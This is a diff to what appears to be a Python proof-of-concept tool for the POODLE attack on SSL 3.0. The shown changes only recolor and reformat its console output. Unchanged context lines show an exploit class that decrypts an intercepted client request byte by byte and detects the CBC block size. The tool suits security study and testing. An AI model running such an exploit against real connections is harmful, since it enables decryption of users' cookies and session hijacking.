@@ -13,6 +13,7 @@ import sys
 import struct
 import threading
 import time
+from utils.color import draw
 from pprint import pprint
 from struct import *
 
@@ -68,8 +69,8 @@ class Client:
         self.proxy_host = host
         self.proxy_port = port
         self.cookie = ''.join(random.SystemRandom().choice(string.uppercase + string.digits + string.lowercase) for _ in xrange(15))
-        print "Sending request : "
-        print "GET / HTTP/1.1\r\nCookie: " + self.cookie + "\r\n\r\n"
+        print draw("Sending request : ", bold=True, fg_yellow=True)
+        print draw("GET / HTTP/1.1\r\nCookie: " + self.cookie + "\r\n\r\n",  bold=True, fg_yellow=True)
 
     def connection(self):
         # Initialization of the client
@@ -201,10 +202,10 @@ class Poodle(Client):
         self.start_exploit = True
         # disconnect the client to avoid "connection reset by peer"
         self.client_disconect()
-        print "Start decrypting the request...\n"
+        print "Start decrypting the request..."
         self.exploit()
         print '\n'
-        print self.request
+        print draw("%r" %(self.request), bold=True, fg_yellow=True)
         print '\n'
         self.client_disconect()
         return
@@ -225,9 +226,8 @@ class Poodle(Client):
                 (plain, nb_request) = self.find_plaintext_byte(self.frame,j)
                 self.request += plain
                 percent = 100.0 * self.byte_decipher / (length_f - 2 * self.length_block)
-                sys.stdout.write("\rProgression %2.0f%% - client's request %4s - byte found: %s" % (percent, nb_request, plain))
+                sys.stdout.write("\rProgression %2.0f%% - client's request %4s - byte found: %r" % (percent, nb_request, plain))
                 sys.stdout.flush()
-                print ''
         return
 
     def choosing_block(self, current_block):
@@ -236,6 +236,7 @@ class Poodle(Client):
     def find_plaintext_byte(self, frame, byte):
         nb_request = 0
         plain = ""
+        print ''
         while True:
             self.client_connection()
             time.sleep(0.0001)
@@ -272,7 +273,7 @@ class Poodle(Client):
             self.length_block = current_length - reference_length
             if self.length_block != 0:
                 self.nb_prefix = i
-                print "CBC block size " + str(self.length_block) + "\n"
+                print draw("CBC block size " + str(self.length_block) + "\n", bold=True)
                 break
             i += 1
         self.decipherable = False
